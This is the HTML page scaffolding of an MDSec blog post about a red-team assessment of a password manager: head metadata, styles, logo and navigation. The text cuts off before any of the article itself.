
<!DOCTYPE html>
<!--[if lt IE 7 ]><html lang="en-GB" class="no-js ie ie6 lte7 lte8 lte9"><![endif]-->
<!--[if IE 7 ]><html lang="en-GB" class="no-js ie ie7 lte7 lte8 lte9"><![endif]-->
<!--[if IE 8 ]><html lang="en-GB" class="no-js ie ie8 lte8 lte9"><![endif]-->
<!--[if IE 9 ]><html lang="en-GB" class="no-js ie ie9 lte9"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--><html lang="en-GB" class="no-js"><!--<![endif]-->
	
	<head>
		<!-- Global site tag (gtag.js) - Google Analytics -->
		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-67981177-1" type="af251fe0fdb97546bb0e0528-text/javascript"></script>
		<script type="af251fe0fdb97546bb0e0528-text/javascript">
	  		window.dataLayer = window.dataLayer || [];
	  		function gtag(){dataLayer.push(arguments);}
	  		gtag('js', new Date());

	  		gtag('config', 'UA-67981177-1');
		</script>
		<meta charset="utf-8">
	    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	    
	    <title>The Not So Pleasant Password Manager - MDSec</title>
	           
		<!-- iPhone Scaling 1:1 (RESPONSIVE) -->
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
			    	   		
		<!-- Favicons Start -->
		<link rel="apple-touch-icon" sizes="57x57" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-180x180.png">
		<link rel="icon" type="image/png" sizes="192x192" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-16x16.png">
		<link rel="manifest" href="/manifest.json">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
		<meta name="theme-color" content="#ffffff">
		<!-- Favicons End -->   
	        
		<!-- Typekit Fonts -->
		<!--<link rel="stylesheet" href="https://use.typekit.net/jsa1tji.css">-->
		<link rel="stylesheet" href="https://use.typekit.net/icv6vdt.css">
	    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	
	<!-- This site is optimized with the Yoast SEO plugin v24.2 - https://yoast.com/wordpress/plugins/seo/ -->
	<link rel="canonical" href="https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/" />
	<meta property="og:locale" content="en_GB" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="The Not So Pleasant Password Manager - MDSec" />
	<meta property="og:description" content="Overview During a recent adversary simulation, the MDSec ActiveBreach red team were asked to investigate the organisation&#8217;s Password Manager solution, with the key objective of compromising stored credentials, ideally from..." />
	<meta property="og:url" content="https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/" />
	<meta property="og:site_name" content="MDSec" />
	<meta property="article:published_time" content="2023-09-19T12:42:36+00:00" />
	<meta property="article:modified_time" content="2023-09-25T11:25:25+00:00" />
	<meta property="og:image" content="https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg" />
	<meta property="og:image:width" content="1000" />
	<meta property="og:image:height" content="667" />
	<meta property="og:image:type" content="image/jpeg" />
	<meta name="author" content="Admin" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:creator" content="@mdseclabs" />
	<meta name="twitter:site" content="@mdseclabs" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="Admin" />
	<meta name="twitter:label2" content="Estimated reading time" />
	<meta name="twitter:data2" content="7 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#article","isPartOf":{"@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/"},"author":{"name":"Admin","@id":"https://www.mdsec.co.uk/#/schema/person/17b494d22ae189270c1e0e41b25fcae3"},"headline":"The Not So Pleasant Password Manager","datePublished":"2023-09-19T12:42:36+00:00","dateModified":"2023-09-25T11:25:25+00:00","mainEntityOfPage":{"@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/"},"wordCount":935,"publisher":{"@id":"https://www.mdsec.co.uk/#organization"},"image":{"@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#primaryimage"},"thumbnailUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","keywords":["ActiveBreach","adversary simulation","red team"],"articleSection":["ActiveBreach","Adversary Simulation","Penetration testing","Red Team"],"inLanguage":"en-GB"},{"@type":"WebPage","@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/","url":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/","name":"The Not So Pleasant Password Manager - MDSec","isPartOf":{"@id":"https://www.mdsec.co.uk/#website"},"primaryImageOfPage":{"@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#primaryimage"},"image":{"@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#primaryimage"},"thumbnailUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","datePublished":"2023-09-19T12:42:36+00:00","dateModified":"2023-09-25T11:25:25+00:00","breadcrumb":{"@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#breadcrumb"},"inLanguage":"en-GB","potentialAction":[{"@type":"ReadAction","target":["https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/"]}]},{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#primaryimage","url":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","contentUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","width":1000,"height":667},{"@type":"BreadcrumbList","@id":"https://www.mdsec.co.uk/2023/09/the-not-so-pleasant-password-manager/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.mdsec.co.uk/"},{"@type":"ListItem","position":2,"name":"The Not So Pleasant Password Manager"}]},{"@type":"WebSite","@id":"https://www.mdsec.co.uk/#website","url":"https://www.mdsec.co.uk/","name":"MDSec","description":"Unrivalled Security Consulting &amp; Training","publisher":{"@id":"https://www.mdsec.co.uk/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.mdsec.co.uk/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-GB"},{"@type":"Organization","@id":"https://www.mdsec.co.uk/#organization","name":"MDSec","url":"https://www.mdsec.co.uk/","logo":{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/#/schema/logo/image/","url":"https://www.mdsec.co.uk/wp-content/uploads/2020/08/MDSec-Logo-Blue.png","contentUrl":"https://www.mdsec.co.uk/wp-content/uploads/2020/08/MDSec-Logo-Blue.png","width":1500,"height":1000,"caption":"MDSec"},"image":{"@id":"https://www.mdsec.co.uk/#/schema/logo/image/"},"sameAs":["https://x.com/mdseclabs"]},{"@type":"Person","@id":"https://www.mdsec.co.uk/#/schema/person/17b494d22ae189270c1e0e41b25fcae3","name":"Admin","image":{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&d=wp_user_avatar&r=g","contentUrl":"https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&d=wp_user_avatar&r=g","caption":"Admin"},"sameAs":["https://x.com/mdseclabs"],"url":"https://www.mdsec.co.uk/author/dominic/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='stylesheet' id='wp-block-library-css' href='https://www.mdsec.co.uk/wp-includes/css/dist/block-library/style.min.css?ver=8ec5aee54c4933b4c67aa5b74f1e261c' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='taxonomy-image-plugin-public-css' href='https://www.mdsec.co.uk/wp-content/plugins/taxonomy-images/css/style.css?ver=0.9.6' type='text/css' media='screen' />
<link rel='stylesheet' id='style-css' href='https://www.mdsec.co.uk/wp-content/themes/mdsec/css/style.css?ver=1.1.5' type='text/css' media='all' />
<link rel='stylesheet' id='prism-css-css' href='https://www.mdsec.co.uk/wp-content/themes/mdsec/css/solarized_dark.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='flickity-css-css' href='https://www.mdsec.co.uk/wp-content/themes/mdsec/css/flickity.min.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='hamburger-css-css' href='https://www.mdsec.co.uk/wp-content/themes/mdsec/css/hamburgers.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css' href='https://www.mdsec.co.uk/wp-content/themes/mdsec/css/font-awesome.min.css?ver=8ec5aee54c4933b4c67aa5b74f1e261c' type='text/css' media='all' />
<!--[if lt IE 9]>
<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/html5shiv.js?ver=3.7.3" id="html5js-js"></script>
<![endif]-->
<!--[if lt IE 9]>
<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/respond.js?ver=1.3.1" id="respond-script-js"></script>
<![endif]-->
<!--[if lt IE 9]>
<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/selectivizr-min.js?ver=1.0.2" id="selectivizr-script-js"></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://www.mdsec.co.uk/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.mdsec.co.uk/wp-json/wp/v2/posts/3292" /><link rel='shortlink' href='https://www.mdsec.co.uk/?p=3292' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.mdsec.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.mdsec.co.uk%2F2023%2F09%2Fthe-not-so-pleasant-password-manager%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.mdsec.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.mdsec.co.uk%2F2023%2F09%2Fthe-not-so-pleasant-password-manager%2F&#038;format=xml" />
		<style type="text/css" id="wp-custom-css">
			.insights-content p
{
	font-family: titling-gothic-fb,sans-serif;
	color: #777a85;
}

.insights-content ul li
{
	font-family: titling-gothic-fb,sans-serif;
color: #777a85;
}


.insights-content h2
{
	font-family: fabrikat_mono_regular;
	font-weight: bold;
}

.insights-content figure
{
	justify-content: center;
}

.insights-content .wp-block-code code {
    max-width: 1000px;
    display: block;
    overflow-x: auto;
    color: #839496;
    margin: 0 auto;
    -webkit-text-size-adjust: none;
    font-size: 1.3rem;
    line-height: 20px;
		padding: 2px 0px;
}		</style>
					    
	</head>
	    
	<body class="post-template-default single single-post postid-3292 single-format-standard">
    <!--[if lt IE 7]>
        <div class="browse-happy">
        	 <a href="https://www.mdsec.co.uk">
				<div id="logo">Logo</div>
			</a>
        	<p>You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        </div>    	
    <![endif]-->              
	
	<!-- Site Wrapper Start --> 
	<div class="site-wrapper">
		
	<!-- Header Start --> 
	<header class="clearfix">
		<div class="logo">
			<a href="https://www.mdsec.co.uk" title="MDSec">
				<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 188.3 50" style="enable-background:new 0 0 188.3 50;" xml:space="preserve">
				<g>
					<g>
						<path class="st0" d="M71.3,49.7V33.1l-7.7,16.5h-5.9l-7.5-16.5v16.5h-5.7V24.9h7.7l8.5,18.9l8.7-18.9H77v24.8H71.3z"/>
						<path class="st0" d="M95.8,49.7H80V24.9h15.6c5.7,0,9,1.6,10.6,4.4c1.2,1.8,1.6,4,1.6,7.6c0,3.9-0.4,6.1-1.5,8
							C104.7,47.9,101.4,49.7,95.8,49.7z M101.9,37c0-2.1-0.3-3.9-1-4.8c-1.1-1.7-2.9-2.5-6.2-2.5H86v15h8.6c3.4,0,5.3-0.8,6.4-2.4
							C101.7,41.3,101.9,39.3,101.9,37z"/>
						<path class="st0" d="M125.2,50c-8.7,0-13.1-2.8-13.4-7.9h2.8c0.2,3.7,4.1,5.4,10.6,5.4c6.9,0,9.3-1.8,9.3-4.5c0-2.9-2.1-4.1-9.9-5
							c-5.9-0.7-12.3-1.4-12.3-6.8c0-3.6,3.1-6.7,11.8-6.7c8.5,0,11.9,3.5,12.7,7.3h-2.9c-0.7-2.9-3.5-4.8-9.9-4.8
							c-6.3,0-8.9,1.7-8.9,4.1c0,3.4,4.9,3.9,10.1,4.4c7.5,0.8,12.1,2.1,12.1,7.2C137.3,47.2,133.8,50,125.2,50z"/>
						<path class="st0" d="M151.9,50c-7.3,0-11.6-2.8-11.6-9.2c0-5.8,4.3-8.9,11.5-8.9c8.1,0,11.7,4,11.4,10h-20.3c0.1,3.8,3.5,6,9.2,6
							c5.9,0,7.9-2.2,8.3-3.5h2.6C162.2,47.2,159.3,50,151.9,50z M151.7,34c-5.8,0-8.9,2.3-8.9,5.8h17.7C160.5,36.4,157.9,34,151.7,34z"
							/>
						<path class="st0" d="M185.7,38.5c-0.1-0.8-0.3-1.4-0.9-2c-1.2-1.4-3.7-2.4-7.4-2.4c-3.8,0-6.4,0.9-7.9,2.7c-0.9,1-1.2,2.4-1.2,4.2
							c0,1.9,0.4,3.3,1.3,4.3c1.4,1.7,4.1,2.5,7.9,2.5c3.7,0,5.9-0.7,7.2-1.9c0.6-0.6,1-1.5,1.1-2.2h2.6c-0.2,1.3-0.7,2.6-1.6,3.5
							C185,49,182,50,177.3,50c-4.8,0-8.1-1.1-9.9-3.3c-1.2-1.4-1.8-3.3-1.8-5.8c0-2.3,0.6-4.2,1.7-5.6c1.9-2.2,5.3-3.5,9.9-3.5
							c5.3,0,8.4,1.5,9.8,3.5c0.8,1,1,2.1,1.1,3.2H185.7z"/>
					</g>
					<path class="st0" d="M31,44.1H2c-1.1,0-2,0.9-2,2v3.5h32.9V46C32.9,45,32,44.1,31,44.1z"/>
					<path class="st0" d="M19.5,19.2l0.3,0c0.9-0.1,1.6-0.4,2.3-0.9l0,0l3,2.5c0.3,0.3,0.7,0.5,1.1,0.6c1.2,0.3,2.4-0.2,3-1.2l1.8-1.9
						c0.3-0.3,0.3-0.7,0.1-1l-5.4-7.5C25.2,9.3,25,8.6,24.8,8c-0.2-1.1-0.9-2-1.9-2.5l-3.7-1.9l2.5-2.5l0,0c0,0-0.1-0.1-0.1-0.1
						c-0.6-0.6-1.4-1-2.3-1c-0.6,0-1.1,0.1-1.6,0.4l0,0l-7.7,3.3l0,0c-4.7,2-8,6.7-8,12.1v2L5.9,14v2.7L2,20.5v2.7l3.8-3.8v2.7L2,25.9
						v2.7l3.8-3.8v2.7L2,31.4v1.7h3.9L2,37V42H31v-0.7c0-7.7-3.2-12.2-6.5-14.4c-2.4-1.6-8.1-3.3-8.1-8.4c0.8,0.5,1.8,0.8,2.8,0.8
						C19.3,19.2,19.4,19.2,19.5,19.2z"/>
				</g>
				</svg>
			</a>
		</div>
							
		<!-- Navigation Start -->   
		<nav role="navigation" class="main-navigation" id="main-navigation">        		
    		<ul id="menu-main-navigation" class="clearfix"><li id="menu-item-367" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-367"><a href="#">Our Services</a></li>
<li id="menu-item-368" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#">Knowledge Centre</a></li>
<li id="menu-item-19" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19"><a href="https://www.mdsec.co.uk/about/">About</a></li>
<li id="menu-item-20" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20"><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
</ul>		</nav>
		<!-- Navigation End--> 	
		
		<!-- Navigation Start -->   
		<nav role="navigation" class="mobile-navigation" id="mobile-navigation">        		
    		<ul id="menu-mobile-navigation" class="clearfix"><li id="menu-item-373" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-373"><a href="#">Our Services</a>
<ul class="sub-menu">
	<li id="menu-item-374" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374"><a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">Adversary Simulation</a></li>
	<li id="menu-item-375" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-375"><a href="https://www.mdsec.co.uk/our-services/application-security/">Application Security</a></li>
	<li id="menu-item-376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-376"><a href="https://www.mdsec.co.uk/our-services/penetration-testing/">Penetration Testing</a></li>
	<li id="menu-item-377" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-377"><a href="https://www.mdsec.co.uk/our-services/response/">Response</a></li>
</ul>
</li>
<li id="menu-item-378" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-378"><a href="#">Knowledge Centre</a>
<ul class="sub-menu">
	<li id="menu-item-379" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-379"><a href="https://www.mdsec.co.uk/knowledge-centre/insights/">Insights</a></li>
	<li id="menu-item-380" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-380"><a href="https://www.mdsec.co.uk/knowledge-centre/research/">Research</a></li>
	<li id="menu-item-381" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-381"><a href="https://www.mdsec.co.uk/knowledge-centre/training/">Training</a></li>
</ul>
</li>
<li id="menu-item-371" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-371"><a href="https://www.mdsec.co.uk/about/">About</a></li>
<li id="menu-item-372" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-372"><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
</ul>		</nav>
		<!-- Navigation End--> 		
		
		
		<div class="menu-toggle">
			<button class="hamburger hamburger--slider" type="button">
				<span class="hamburger-box">
					<span class="hamburger-inner"></span>
				</span>
			</button>		
		</div>		   	       		
	</header>
    <!-- Header End --> 
		
		
	<div class="subnav">
		<section class="content-wrapper">
			<ul class="service-list clearfix">
				<li class="item">
					<a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">
						<div class="service-icon">
							<img src="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/icons/icon-adversary.svg" alt="Adversary">
						</div>
						<hgroup>
							<h2>
								Adversary Simulation
							</h2>
						</hgroup>
						<p>Our best in class red team can deliver a holistic cyber attack simulation to provide a true evaluation of your organisation&#8217;s cyber resilience.</p>
						
					</a>
				</li>
				<li class="item">
					<a href="https://www.mdsec.co.uk/our-services/applicaton-security/">
